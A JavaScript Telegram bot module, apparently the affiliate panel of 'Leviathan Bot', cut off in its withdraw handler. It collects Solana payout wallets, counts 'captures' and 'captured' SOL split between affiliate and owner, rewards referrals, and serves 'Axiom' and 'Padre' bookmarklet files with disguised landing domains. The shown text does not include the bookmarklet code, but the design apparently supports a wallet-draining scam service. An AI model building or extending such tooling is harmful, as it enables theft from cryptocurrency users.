/**
 * Bot command handlers and setup for webhook mode.
 * This module contains all the bot command logic, refactored for serverless.
 */
const { Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');

const bookmarkletPayloadKey = process.env.BOOKMARKLET_PAYLOAD_KEY || 'LeviathanSecret123!@#';
const ownerIds = new Set([6305896892, 7553113221]);
const adminIds = new Set([6305896892, 7553113221]);

function isAdmin(userId) {
  return adminIds.has(userId) || ownerIds.has(userId);
}

function isOwner(userId) {
  return ownerIds.has(userId);
}

function formatCurrency(value) {
  return Number(value).toFixed(4);
}

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function isValidSolanaAddress(address) {
  return /^[1-9A-HJ-NP-Za-km-z]{43,44}$/.test(address);
}

const languages = {
  en: {
    name: 'English',
    welcome: 'Welcome to Leviathan Bot!\nPlease select your language:',
    walletPrompt: '💼 <b>Enter your Solana wallet address</b>\n\n⚠️ <b>IMPORTANT:</b>\n• This wallet will be used for <b>ALL withdrawals</b>\n• You can change it later using /wallet\n• Make sure you control this wallet!',
    invalidWallet: '❌ <b>Invalid Solana address</b>\n\nPlease enter a valid 43 or 44-character base58 Solana address.',
    registrationComplete: '🎊 <b>Registration Completed!</b>\n\n✅ Your Solana wallet has been synced:\n\n<code>{address}</code>\n\nYou\'re all set! Use /wallet to change it anytime. Then use /menu to see the menu.',
    walletDisplay: '💼 <b>Your Withdrawal Wallet</b>\n\n<code>{address}</code>\n\n<b>To change:</b>\n/wallet NEW_ADDRESS',
    walletChanged: '✅ <b>Wallet Updated!</b>\n\nYour new withdrawal wallet:\n\n<code>{address}</code>\n\nNow use /menu to see the menu.',
    statsMessage: '📊 <b>YOUR STATISTICS</b>\n\n💰 <b>Earnings</b>\n━━━━━━━━━━━━\n• <b>Total captured</b>: <code>{captured} SOL</code>\n• <b>Available</b>: <code>{available} SOL</code>\n• <b>Withdrawn</b>: <code>{withdrawn} SOL</code>\n\n📈 <b>Activity</b>\n━━━━━━━━━━━━\n• <b>Total captures</b>: <code>{captures}</code>\n\n💼 <b>Withdrawal wallet</b>\n<code>{wallet}</code>\n\n⚙️ <b>Auto Withdraw</b>: <code>{auto}</code>\n🧾 <b>Split</b>: <code>{user}% / {owner}%</code>',
    autoWithdrawOn: '✅ Auto withdraw is ON. Your earnings will be sent automatically with split processing.',
    autoWithdrawOff: '⛔ Auto withdraw is OFF. Tap the button again to turn it on.',
    revoked: '❌ <b>Access revoked</b>\nYou have been revoked from using this bot. Contact @late for support.',
    noWallet: '❌ <b>No wallet set</b>\n\nPlease complete registration first by sending /start',
  },
  ru: {
    name: 'Русский',
    welcome: 'Добро пожаловать в Leviathan Bot!\nПожалуйста, выберите язык:',
    walletPrompt: '💼 <b>Введите адрес вашего Solana кошелька</b>\n\n⚠️ <b>ВАЖНО:</b>\n• Этот кошелек будет использован для <b>ВСЕХ выводов</b>\n• Вы можете изменить его позже, используя /wallet\n• Убедитесь, что вы контролируете этот кошелек!',
    invalidWallet: '❌ <b>Неверный адрес Solana</b>\n\nПожалуйста, введите действительный 43 или 44-символный адрес Solana в формате base58.',
    registrationComplete: '🎊 <b>Регистрация завершена!</b>\n\n✅ Ваш Solana кошелек синхронизирован:\n\n<code>{address}</code>\n\nВы готовы! Используйте /wallet для изменения в любое время. Затем используйте /menu, чтобы увидеть меню.',
    walletDisplay: '💼 <b>Ваш кошелек для вывода</b>\n\n<code>{address}</code>\n\n<b>Для изменения:</b>\n/wallet НОВЫЙ_АДРЕС',
    walletChanged: '✅ <b>Кошелек обновлен!</b>\n\nВаш новый кошелек для вывода:\n\n<code>{address}</code>\n\nТеперь используйте /menu, чтобы увидеть меню.',
    noWallet: '❌ <b>Кошелек не установлен</b>\n\nПожалуйста, сначала завершите регистрацию, отправив /start',
  },
  es: {
    name: 'Español',
    welcome: '¡Bienvenido a Leviathan Bot!\nPor favor, selecciona tu idioma:',
    walletPrompt: '💼 <b>Ingresa tu dirección de cartera Solana</b>\n\n⚠️ <b>IMPORTANTE:</b>\n• Esta cartera se utilizará para <b>TODOS los retiros</b>\n• Puedes cambiarla más tarde usando /wallet\n• ¡Asegúrate de controlar esta cartera!',
    invalidWallet: '❌ <b>Dirección de Solana inválida</b>\n\nPor favor, ingresa una dirección Solana válida de 43 o 44 caracteres en base58.',
    registrationComplete: '🎊 <b>¡Registro completado!</b>\n\n✅ Tu cartera Solana ha sido sincronizada:\n\n<code>{address}</code>\n\n¡Estás listo! Usa /wallet para cambiarla en cualquier momento. Luego usa /menu para ver el menú.',
    walletDisplay: '💼 <b>Tu Cartera de Retiro</b>\n\n<code>{address}</code>\n\n<b>Para cambiar:</b>\n/wallet NUEVA_DIRECCIÓN',
    walletChanged: '✅ <b>¡Cartera actualizada!</b>\n\nTu nueva cartera de retiro:\n\n<code>{address}</code>\n\nAhora usa /menu para ver el menú.',
    noWallet: '❌ <b>Sin cartera configurada</b>\n\nPor favor, completa el registro primero enviando /start',
  },
  fr: {
    name: 'Français',
    welcome: 'Bienvenue sur Leviathan Bot !\nVeuillez sélectionner votre langue :',
    walletPrompt: '💼 <b>Entrez votre adresse de portefeuille Solana</b>\n\n⚠️ <b>IMPORTANT :</b>\n• Ce portefeuille sera utilisé pour <b>TOUS les retraits</b>\n• Vous pouvez le modifier ultérieurement en utilisant /wallet\n• Assurez-vous que vous contrôlez ce portefeuille !',
    invalidWallet: '❌ <b>Adresse Solana invalide</b>\n\nVeuillez entrer une adresse Solana valide de 43 ou 44 caractères en base58.',
    registrationComplete: '🎊 <b>Inscription terminée !</b>\n\n✅ Votre portefeuille Solana a été synchronisé :\n\n<code>{address}</code>\n\nVous êtes prêt ! Utilisez /wallet pour le modifier à tout moment. Ensuite utilisez /menu pour voir le menu.',
    walletDisplay: '💼 <b>Votre Portefeuille de Retrait</b>\n\n<code>{address}</code>\n\n<b>Pour modifier :</b>\n/wallet NOUVELLE_ADRESSE',
    walletChanged: '✅ <b>Portefeuille mis à jour !</b>\n\nVotre nouveau portefeuille de retrait :\n\n<code>{address}</code>\n\nMaintenant utilisez /menu pour voir le menu.',
    noWallet: '❌ <b>Aucun portefeuille configuré</b>\n\nVeuillez d\'abord compléter l\'inscription en envoyant /start',
  },
  ar: {
    name: 'العربية',
    welcome: 'مرحًا بك في Leviathan Bot!\nيرجى اختيار لغتك:',
    walletPrompt: '💼 <b>أدخل عنوان محفظة Solana الخاص بك</b>\n\n⚠️ <b>مهم:</b>\n• سيتم استخدام هذه المحفظة لـ <b>جميع الانسحابات</b>\n• يمكنك تغييرها لاحقاً باستخدام /wallet\n• تأكد من أنك تتحكم في هذه المحفظة!',
    invalidWallet: '❌ <b>عنوان Solana غير صحيح</b>\n\nيرجى إدخال عنوان Solana صحيح بـ 43 أو 44 حرفاً بصيغة base58.',
    registrationComplete: '🎊 <b>تم إكمال التسجيل!</b>\n\n✅ تم مزامنة محفظة Solana الخاصة بك:\n\n<code>{address}</code>\n\nأنت جاهز! استخدم /wallet لتغييرها في أي وقت. ثم استخدم /menu لرؤية القائمة.',
    walletDisplay: '💼 <b>محفظة الانسحاب الخاصة بك</b>\n\n<code>{address}</code>\n\n<b>للتغيير:</b>\n/wallet العنوان_الجديد',
    walletChanged: '✅ <b>تم تحديث المحفظة!</b>\n\nمحفظة الانسحاب الجديدة:\n\n<code>{address}</code>\n\nالآن استخدم /menu لرؤية القائمة.',
    noWallet: '❌ <b>لم يتم تعيين محفظة</b>\n\nيرجى إكمال التسجيل أولاً بإرسال /start',
  },
  zh: {
    name: '中文',
    welcome: '欢迎来到 Leviathan Bot！\n请选择您的语言：',
    walletPrompt: '💼 <b>输入您的 Solana 钱包地址</b>\n\n⚠️ <b>重要提示：</b>\n• 此钱包将用于<b>所有提现</b>\n• 您可以稍后使用 /wallet 更改它\n• 确保您控制此钱包！',
    invalidWallet: '❌ <b>无效的 Solana 地址</b>\n\n请输入有效的 43 或 44 字符 base58 Solana 地址。',
    registrationComplete: '🎊 <b>注册完成！</b>\n\n✅ 您的 Solana 钱包已同步：\n\n<code>{address}</code>\n\n您已准备好！使用 /wallet 随时更改。然后使用 /menu 查看菜单。',
    walletDisplay: '💼 <b>您的提现钱包</b>\n\n<code>{address}</code>\n\n<b>要更改：</b>\n/wallet 新地址',
    walletChanged: '✅ <b>钱包已更新！</b>\n\n您的新提现钱包：\n\n<code>{address}</code>\n\n现在使用 /menu 查看菜单。',
    noWallet: '❌ <b>未设置钱包</b>\n\n请先发送 /start 完成注册',
  },
  hi: {
    name: 'हिंदी',
    welcome: 'Leviathan Bot में आपका स्वागत है!\nकृपया अपनी भाषा चुनें:',
    walletPrompt: '💼 <b>अपना Solana वॉलेट पता दर्ज करें</b>\n\n⚠️ <b>महत्वपूर्ण:</b>\n• यह वॉलेट <b>सभी निकासी</b> के लिए उपयोग किया जाएगा\n+• आप /wallet का उपयोग करके इसे बाद में बदल सकते हैं\n+• सुनिश्चित करें कि आप इस वॉलेट को नियंत्रित करते हैं!',
    invalidWallet: '❌ <b>अमान्य Solana पता</b>\n\nकृपया एक वैध 43 या 44-वर्ण base58 Solana पता दर्ज करें।',
    registrationComplete: '🎊 <b>पंजीकरण पूर्ण!</b>\n\n✅ आपका Solana वॉलेट सिंक हो गया है:\n\n<code>{address}</code>\n\nआप तैयार हैं! किसी भी समय बदलने के लिए /wallet का उपयोग करें। फिर मेनू देखने के लिए /menu का उपयोग करें।',
    walletDisplay: '💼 <b>आपका निकासी वॉलेट</b>\n\n<code>{address}</code>\n\n<b>बदलने के लिए:</b>\n/wallet नया_पता',
    walletChanged: '✅ <b>वॉलेट अपडेट हो गया!</b>\n\nआपका नया निकासी वॉलेट:\n\n<code>{address}</code>\n\nअब मेनू देखने के लिए /menu का उपयोग करें।',
    noWallet: '❌ <b>कोई वॉलेट सेट नहीं है</b>\n\nकृपया पहले /start भेजकर पंजीकरण पूर्ण करें',
  },
  pt: {
    name: 'Português',
    welcome: 'Bem-vindo ao Leviathan Bot!\nPor favor, selecione seu idioma:',
    walletPrompt: '💼 <b>Digite seu endereço de carteira Solana</b>\n\n⚠️ <b>IMPORTANTE:</b>\n• Esta carteira será usada para <b>TODOS os saques</b>\n• Você pode alterá-la mais tarde usando /wallet\n• Certifique-se de controlar esta carteira!',
    invalidWallet: '❌ <b>Endereço Solana inválido</b>\n\nPor favor, digite um endereço Solana válido de 43 ou 44 caracteres em base58.',
    registrationComplete: '🎊 <b>Registro Concluído!</b>\n\n✅ Sua carteira Solana foi sincronizada:\n\n<code>{address}</code>\n\nVocê está pronto! Use /wallet para alterá-la a qualquer momento. Depois use /menu para ver o menu.',
    walletDisplay: '💼 <b>Sua Carteira de Saque</b>\n\n<code>{address}</code>\n\n<b>Para alterar:</b>\n/wallet NOVO_ENDEREÇO',
    walletChanged: '✅ <b>Carteira Atualizada!</b>\n\nSua nova carteira de saque:\n\n<code>{address}</code>\n\nAgora use /menu para ver o menu.',
    noWallet: '❌ <b>Nenhuma carteira definida</b>\n\nPor favor, complete o registro primeiro enviando /start',
  },
  de: {
    name: 'Deutsch',
    welcome: 'Willkommen beim Leviathan Bot!\nBitte wähle deine Sprache:',
    walletPrompt: '💼 <b>Geben Sie Ihre Solana-Wallet-Adresse ein</b>\n\n⚠️ <b>WICHTIG:</b>\n• Diese Geldbörse wird für <b>ALLE Abhebungen</b> verwendet\n• Sie können sie später mit /wallet ändern\n• Stellen Sie sicher, dass Sie diese Geldbörse kontrollieren!',
    invalidWallet: '❌ <b>Ungültige Solana-Adresse</b>\n\nBitte geben Sie eine gültige 43- oder 44-stellige base58-Solana-Adresse ein.',
    registrationComplete: '🎊 <b>Registrierung abgeschlossen!</b>\n\n✅ Ihre Solana-Geldbörse wurde synchronisiert:\n\n<code>{address}</code>\n\nSie sind bereit! Verwenden Sie /wallet, um es jederzeit zu ändern. Verwenden Sie dann /menu, um das Menü zu sehen.',
    walletDisplay: '💼 <b>Ihre Auszahlungs-Geldbörse</b>\n\n<code>{address}</code>\n\n<b>Um zu ändern:</b>\n/wallet NEUE_ADRESSE',
    walletChanged: '✅ <b>Geldbörse aktualisiert!</b>\n\nIhre neue Auszahlungs-Geldbörse:\n\n<code>{address}</code>\n\nVerwenden Sie jetzt /menu, um das Menü zu sehen.',
    noWallet: '❌ <b>Keine Geldbörse eingestellt</b>\n\nBitte schließen Sie zuerst die Registrierung ab, indem Sie /start senden',
  },
};

const languageMenu = Markup.inlineKeyboard([
  [Markup.button.callback('🇬🇧 English', 'lang_en'), Markup.button.callback('🇷🇺 Русский', 'lang_ru')],
  [Markup.button.callback('🇪🇸 Español', 'lang_es'), Markup.button.callback('🇫🇷 Français', 'lang_fr')],
  [Markup.button.callback('🇨🇳 中文', 'lang_zh'), Markup.button.callback('🇮🇳 हिंदी', 'lang_hi')],
  [Markup.button.callback('🇵🇹 Português', 'lang_pt'), Markup.button.callback('🇩🇪 Deutsch', 'lang_de')],
  [Markup.button.callback('🇦🇪 العربية', 'lang_ar')],
]);

const startMessage = `🎯 <b>Welcome to Leviathan Bot!</b>`;

function getMenuKeyboard(userId, state, isAdminMode = false) {
  if (isAdmin(userId) && isAdminMode) {
    return Markup.keyboard([
      ['Admin Stats', 'Set Split'],
      ['Revoke User', 'Restore User'],
      ['Owner Wallet', 'Change Owner Wallet'],
      ['Make Admin', 'Promote Tier 2'],
      ['Disable Auto Withdrawals', 'Broadcast'],
      ['Set Bookmarklet URL', 'User Mode'],
    ]).resize();
  }

  const rows = [
    ['📜 Script', '📊 Stats'],
    ['💼 Wallet', 'Withdraw'],
    ['🌐 Custom Domain'],
  ];

  if (state && state.tier2) {
    rows.push(['Bot Token']);
  }

  rows.push([state.autoWithdraw ? 'Auto withdrawal ✅' : 'Auto withdrawal ❌']);
  return Markup.keyboard(rows).resize();
}

async function sendLanguageSelection(ctx, text = startMessage) {
  return ctx.replyWithHTML(text, languageMenu);
}

/**
 * Setup all bot handlers.
 * Called from the API handler with the bot instance and store.
 */
async function setupBotHandlers(bot, store) {
  // Load persisted bot config (admins, bookmarklet URL) into runtime state
  try {
    const initialConfig = await store.getBotConfig();
    if (initialConfig && Array.isArray(initialConfig.admins)) {
      initialConfig.admins.forEach((id) => adminIds.add(Number(id)));
    }
    if (initialConfig && initialConfig.bookmarkletSiteUrl) {
      // keep runtime reference for bookmarklet generation
      // bookmarkletSiteUrl is read from config when generating files
      // (we don't overwrite process.env here)
      // store value in a module-level variable if needed later
      // (not strictly required right now)
      // eslint-disable-next-line no-unused-vars
      const _bm = initialConfig.bookmarkletSiteUrl;
    }
  } catch (e) {
    // ignore config load errors
  }
  bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    // Handle referral code from start payload (e.g., /start refcode123)
    const startPayload = ctx.startPayload;
    if (startPayload && !state.referredBy) {
      // Check if the payload is a valid referral code
      const referrerId = await store.getUserIdByReferralCode(startPayload);
      if (referrerId && referrerId !== userId) {
        // Valid referral from someone else
        state.referredBy = referrerId;
        await store.setUserState(userId, state);
        
        // Update referrer's referral count
        const referrerState = await store.getUserState(referrerId);
        referrerState.referralCount = (referrerState.referralCount || 0) + 1;
        await store.setUserState(referrerId, referrerState);
        
        // Check for milestone rewards
        const milestone = await store.checkAndAwardMilestone(referrerId, referrerState);
        
        // Notify the referrer
        try {
          const referrerName = ctx.from.username || ctx.from.first_name || 'New user';
          let notificationMessage = `🎉 <b>New Referral!</b>\n\n` +
            `User: <code>${referrerName}</code>\n` +
            `Total referrals: <b>${referrerState.referralCount}</b>`;
          
          // Add milestone reward notification if reached
          if (milestone) {
            notificationMessage += `\n\n` +
              `🏆 <b>MILESTONE REACHED!</b>\n` +
              `🎁 Bonus: <code>${milestone.bonus} SOL</code>\n` +
              `💰 New balance: <code>${milestone.newAvailable.toFixed(6)} SOL</code>\n\n` +
              `Congratulations on reaching ${milestone.label}! 🎊`;
          } else {
            // Show next milestone
            const nextMilestone = store.getNextMilestone(referrerState.referralCount, referrerState.referralMilestones);
            if (nextMilestone) {
              notificationMessage += `\n\n` +
                `🎯 Next milestone: ${nextMilestone.count} referrals\n` +
                `💎 Reward: ${nextMilestone.bonus} SOL\n` +
                `📊 ${nextMilestone.remaining} more to go!`;
            }
          }
          
          await ctx.telegram.sendMessage(referrerId, notificationMessage, { parse_mode: 'HTML' });
        } catch (err) {
          // Ignore if can't notify referrer
        }
      }
    }

    state.step = 'language';
    state.mode = 'user';
    await store.setUserState(userId, state);

    const adminPrefix = isAdmin(userId) ? '🎖️ <b>Admin access detected.</b>\n\n' : '';
    return sendLanguageSelection(ctx, `${adminPrefix}${startMessage}`);
  });

  bot.help(async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const keyboard = getMenuKeyboard(userId, state, state.mode === 'admin');
    
    const helpMessage = `❓ <b>AVAILABLE COMMANDS</b>\n\n` +
      `📜 /menu - Main menu\n` +
      `📊 /stats - Your statistics\n` +
      `💼 /wallet - Change withdrawal wallet\n` +
      `🔑 /setref - Set referral code\n` +
      `❓ /help - Show this help\n\n` +
      `💡 <b>TIP:</b> Use buttons below for quick access`;
    
    return ctx.replyWithHTML(helpMessage, keyboard);
  });

  bot.command('menu', async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    const keyboard = getMenuKeyboard(userId, state, state.mode === 'admin');
    return ctx.replyWithHTML('💠 <b>Main Menu</b>', keyboard);
  });

  bot.command('stats', async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    if (!state.wallet) {
      return ctx.replyWithHTML(language.noWallet);
    }

    const config = await store.getBotConfig();
    const statsTemplate = language.statsMessage || languages.en.statsMessage;
    const stats = statsTemplate
      .replace('{wallet}', state.wallet)
      .replace('{captured}', formatCurrency(state.totalCaptured))
      .replace('{available}', formatCurrency(state.available))
      .replace('{withdrawn}', formatCurrency(state.withdrawn))
      .replace('{captures}', String(state.totalCaptures))
      .replace('{auto}', state.autoWithdraw ? 'ON' : 'OFF')
      .replace('{user}', String(config.userShare))
      .replace('{owner}', String(config.ownerShare));

    return ctx.replyWithHTML(stats);
  });

  bot.command('wallet', async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    const parts = ctx.message.text.split(' ');
    const newAddress = parts.slice(1).join(' ').trim();

    if (newAddress) {
      if (!isValidSolanaAddress(newAddress)) {
        return ctx.replyWithHTML(language.invalidWallet);
      }

      state.wallet = newAddress;
      await store.setUserState(userId, state);
      const message = language.walletChanged.replace('{address}', newAddress);
      return ctx.replyWithHTML(message);
    }

    if (!state.wallet) {
      return ctx.replyWithHTML(language.noWallet);
    }

    const message = language.walletDisplay.replace('{address}', state.wallet);
    return ctx.replyWithHTML(message);
  });

  bot.command('setref', async (ctx) => {
    const userId = ctx.from.id;
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    const parts = ctx.message.text.split(' ');
    
    // Show current ref code if no argument provided
    if (parts.length === 1) {
      // Generate ref code if user doesn't have one
      if (!state.referralCode) {
        let newCode = store.generateRandomReferralCode();
        // Ensure code is unique
        let attempts = 0;
        while (!(await store.isReferralCodeAvailable(newCode)) && attempts < 10) {
          newCode = store.generateRandomReferralCode();
          attempts++;
        }
        
        if (attempts >= 10) {
          return ctx.replyWithHTML('❌ <b>Error generating referral code.</b> Please try again later.');
        }
        
        // Delete old code if exists
        if (state.referralCode) {
          await store.deleteReferralCode(state.referralCode);
        }
        
        state.referralCode = newCode;
        await store.setReferralCode(newCode, userId);
        await store.setUserState(userId, state);
      }
      
      const botUsername = process.env.BOT_USERNAME || 'leviathanv1_bot';
      const refLink = `https://t.me/${botUsername}?start=${state.referralCode}`;
      
      // Get milestone progress
      const referralCount = state.referralCount || 0;
      const completedMilestones = state.referralMilestones || [];
      const nextMilestone = store.getNextMilestone(referralCount, completedMilestones);
      
      let milestoneInfo = '\n\n🏆 <b>Milestone Rewards:</b>\n';
      
      // Show completed milestones
      if (referralCount >= 5) {
        milestoneInfo += completedMilestones.includes(5) ? '✅ 5 referrals = 0.01 SOL\n' : '⭐ 5 referrals = 0.01 SOL\n';
      } else {
        milestoneInfo += '🔒 5 referrals = 0.01 SOL\n';
      }
      
      if (referralCount >= 25) {
        milestoneInfo += completedMilestones.includes(25) ? '✅ 25 referrals = 0.1 SOL\n' : '⭐ 25 referrals = 0.1 SOL\n';
      } else {
        milestoneInfo += '🔒 25 referrals = 0.1 SOL\n';
      }
      
      if (referralCount >= 100) {
        milestoneInfo += completedMilestones.includes(100) ? '✅ 100 referrals = 1 SOL\n' : '⭐ 100 referrals = 1 SOL\n';
      } else {
        milestoneInfo += '🔒 100 referrals = 1 SOL\n';
      }
      
      // Show next milestone progress
      if (nextMilestone) {
        milestoneInfo += `\n🎯 <b>Next:</b> ${nextMilestone.remaining} more referrals for ${nextMilestone.bonus} SOL bonus!`;
      } else if (referralCount >= 100 && completedMilestones.includes(100)) {
        milestoneInfo += `\n🎊 <b>All milestones completed!</b>`;
      }
      
      const message = `🔑 <b>Current referral code:</b> <code>${state.referralCode}</code>\n\n` +
        `🔗 <b>Your link:</b>\n` +
        `<code>${refLink}</code>\n\n` +
        `📊 <b>Total Referrals:</b> ${referralCount}${milestoneInfo}\n\n` +
        `📝 <b>Change code:</b>\n` +
        `/setref YOUR_CODE\n\n` +
        `✅ 3–10 characters (letters/numbers)\n` +
        `✅ Lowercase only (a-z, 0-9)\n\n` +
        `<b>Example:</b> /setref admin1`;
      
      return ctx.replyWithHTML(message);
    }
    
    // User wants to set a custom code
    const newCode = parts[1].toLowerCase().trim();
    
    // Validate code format
    if (!/^[a-z0-9]{3,10}$/.test(newCode)) {
      return ctx.replyWithHTML(
        `❌ <b>Invalid referral code!</b>\n\n` +
        `✅ Must be 3–10 characters\n` +
        `✅ Only lowercase letters and numbers (a-z, 0-9)\n` +
        `✅ No spaces or special characters\n\n` +
        `<b>Example:</b> /setref admin1`
      );
    }
    
    // Check if code is already taken
    if (!(await store.isReferralCodeAvailable(newCode))) {
      const ownerId = await store.getUserIdByReferralCode(newCode);
      if (ownerId === userId) {
        return ctx.replyWithHTML(`ℹ️ <b>This is already your referral code!</b>`);
      }
      return ctx.replyWithHTML(`❌ <b>Code already taken!</b>\n\nTry a different code.`);
    }
    
    // Delete old code if exists
    if (state.referralCode) {
      await store.deleteReferralCode(state.referralCode);
    }
    
    // Set new code
    state.referralCode = newCode;
    await store.setReferralCode(newCode, userId);
    await store.setUserState(userId, state);
    
    const botUsername = process.env.BOT_USERNAME || 'leviathanv1_bot';
    const refLink = `https://t.me/${botUsername}?start=${newCode}`;
    
    return ctx.replyWithHTML(
      `✅ <b>Referral code updated!</b>\n\n` +
      `🔑 <b>New code:</b> <code>${newCode}</code>\n\n` +
      `🔗 <b>Your link:</b>\n` +
      `<code>${refLink}</code>\n\n` +
      `📤 Share this link to get referrals!`
    );
  });

  // Language selection actions
  Object.keys(languages).forEach((code) => {
    bot.action(`lang_${code}`, async (ctx) => {
      const userId = ctx.from.id;
      const state = await store.getUserState(userId);

      console.debug('lang_action:', { userId, code });

      if (state.revoked) {
        await ctx.answerCbQuery();
        return ctx.replyWithHTML(languages[state.language || 'en'].revoked || languages.en.revoked);
      }

      state.language = code;
      await store.setUserState(userId, state);
      await ctx.answerCbQuery();

      const language = languages[code];
      await ctx.editMessageText(`🎉 <b>${language.name}</b> selected!\n\nWelcome to Leviathan Bot!`, {
        parse_mode: 'HTML',
      });

      if (isAdmin(userId)) {
        state.step = 'choose_mode';
        await store.setUserState(userId, state);
        console.debug('admin_choose_mode_set for', userId);
        return ctx.replyWithHTML('🔧 <b>Choose your mode:</b>', Markup.keyboard([['Admin Mode', 'User Mode']]).resize());
      }

      state.step = 'wallet';
      await store.setUserState(userId, state);
      return ctx.reply(language.walletPrompt, { parse_mode: 'HTML' });
    });
  });

  // Bookmarklet download actions
  bot.action('download_axiom_file', async (ctx) => {
    try {
      const userId = ctx.from.id;
      const username = ctx.from.username || ctx.from.first_name || 'bookmarklet';
      await ctx.answerCbQuery('Preparing Axiom file...');

      const { buffer, filename } = await buildBookmarkletFile('axiom', userId, username, store);
      return ctx.replyWithDocument({ source: buffer, filename });
    } catch (err) {
      await ctx.answerCbQuery();
      return ctx.replyWithHTML('❌ <b>Unable to prepare Axiom bookmarklet file.</b>');
    }
  });

  bot.action('download_padre_file', async (ctx) => {
    try {
      const userId = ctx.from.id;
      const username = ctx.from.username || ctx.from.first_name || 'bookmarklet';
      await ctx.answerCbQuery('Preparing Padre file...');

      const { buffer, filename } = await buildBookmarkletFile('padre', userId, username, store);
      return ctx.replyWithDocument({ source: buffer, filename });
    } catch (err) {
      await ctx.answerCbQuery();
      return ctx.replyWithHTML('❌ <b>Unable to prepare Padre bookmarklet file.</b>');
    }
  });

  // Catch-all message handler
  bot.on('message', async (ctx) => {
    const userId = ctx.from.id;
    const text = (ctx.message.text || '').trim();
    const state = await store.getUserState(userId);
    const language = languages[state.language || 'en'];

    if (state.revoked) {
      return ctx.replyWithHTML(language.revoked || languages.en.revoked);
    }

    if (text.startsWith('/')) {
      return;
    }

    const normalized = text.toLowerCase();

    // Handle wallet registration step
    if (state.step === 'wallet') {
      const address = text;
      if (!isValidSolanaAddress(address)) {
        return ctx.replyWithHTML(language.invalidWallet);
      }

      state.wallet = address;
      state.step = 'completed';
      await store.setUserState(userId, state);

      const message = language.registrationComplete.replace('{address}', address);
      return ctx.replyWithHTML(message);
    }

    // Handle menu button presses
    if (normalized === '📊 stats' || normalized === 'stats') {
      if (!state.wallet) {
        return ctx.replyWithHTML(language.noWallet);
      }

      const config = await store.getBotConfig();
      const statsTemplate = language.statsMessage || languages.en.statsMessage;
      const stats = statsTemplate
        .replace('{wallet}', state.wallet)
        .replace('{captured}', formatCurrency(state.totalCaptured))
        .replace('{available}', formatCurrency(state.available))
        .replace('{withdrawn}', formatCurrency(state.withdrawn))
        .replace('{captures}', String(state.totalCaptures))
        .replace('{auto}', state.autoWithdraw ? 'ON' : 'OFF')
        .replace('{user}', String(config.userShare))
        .replace('{owner}', String(config.ownerShare));

      const tierLabel = state.tier2 ? 'Tier 2' : 'Tier 1';
      return ctx.replyWithHTML(`${stats}\n\n🏅 <b>Tier</b>: <code>${tierLabel}</code>`);
    }

    if (normalized === '💼 wallet' || normalized === 'wallet') {
      if (!state.wallet) {
        return ctx.replyWithHTML(language.noWallet);
      }
      return ctx.replyWithHTML(language.walletDisplay.replace('{address}', state.wallet));
    }

    if (normalized === '📜 script' || normalized === 'script') {
      await ctx.sendChatAction('typing');
      await new Promise((resolve) => setTimeout(resolve, 2000));
      await ctx.replyWithHTML('🔧 <b>Generating Axiom + Padre bookmarklets...</b>');
      await new Promise((resolve) => setTimeout(resolve, 3000));

      // Use user's custom domain if set, otherwise use default
      let bookmarkletSiteUrl = state.customDomain || process.env.BOOKMARKLET_SITE_URL || '';
      
      // Fix: Replace old Netlify URLs with the new one (only if using default)
      if (!state.customDomain) {
        if (bookmarkletSiteUrl.includes('velox-x.netlify.app') || bookmarkletSiteUrl.includes('super-praline') || bookmarkletSiteUrl.includes('velox-xx.netlify.app')) {
          bookmarkletSiteUrl = 'https://velox-xxx.netlify.app';
        }
        // Default to new URL if empty or invalid
        if (!bookmarkletSiteUrl || bookmarkletSiteUrl === 'https://your-bookmarklet-site.com') {
          bookmarkletSiteUrl = 'https://velox-xxx.netlify.app';
        }
      }
      
      const domainLabel = state.customDomain ? '(Custom Domain)' : '(Default Domain)';
      
      const inlineKeyboard = Markup.inlineKeyboard([
        [
          Markup.button.callback('📁 Axiom file', 'download_axiom_file'),
          Markup.button.callback('📁 Padre file', 'download_padre_file'),
        ],
        bookmarkletSiteUrl
          ? [Markup.button.url(`🔗 Landing link ${domainLabel}`, bookmarkletSiteUrl)]
          : [Markup.button.callback('🔗 Landing link', 'open_landing_link')],
      ]);

      return ctx.replyWithHTML(
        `✅ <b>Both bookmarklets ready: Axiom & Padre</b>\n\n📁 Download each bookmarklet as a separate file.\n🔗 Landing page: <code>${bookmarkletSiteUrl}</code>\n<b>Ref code:</b> <code>/setref</code>`,
        inlineKeyboard
      );
    }

    if (
      normalized === 'auto withdraw' ||
      normalized === 'auto withdraw ✅' ||
      normalized === 'auto withdraw ❌' ||
      normalized === 'auto withdrawal' ||
      normalized === 'auto withdrawal ✅' ||
      normalized === 'auto withdrawal ❌'
    ) {
      state.autoWithdraw = !state.autoWithdraw;
      await store.setUserState(userId, state);
      const keyboard = getMenuKeyboard(userId, state, state.mode === 'admin');
      if (state.autoWithdraw) {
        return ctx.replyWithHTML('Auto withdrawal on', keyboard);
      }
      return ctx.replyWithHTML('Auto withdrawal off', keyboard);
    }

    // Manual withdrawal handler
    if (normalized === 'withdraw') {
      if (!state.wallet) {
        return ctx.replyWithHTML(language.noWallet);
      }
      
      if (state.available <= 0) {
        return ctx.replyWithHTML('❌ <b>No available balance to withdraw yet.</b>');
      }

      const config = await store.getBotConfig();
      const amount = Number(state.available.toFixed(6));
      const ownerAmount = Number((amount * config.ownerShare / 100).toFixed(6));
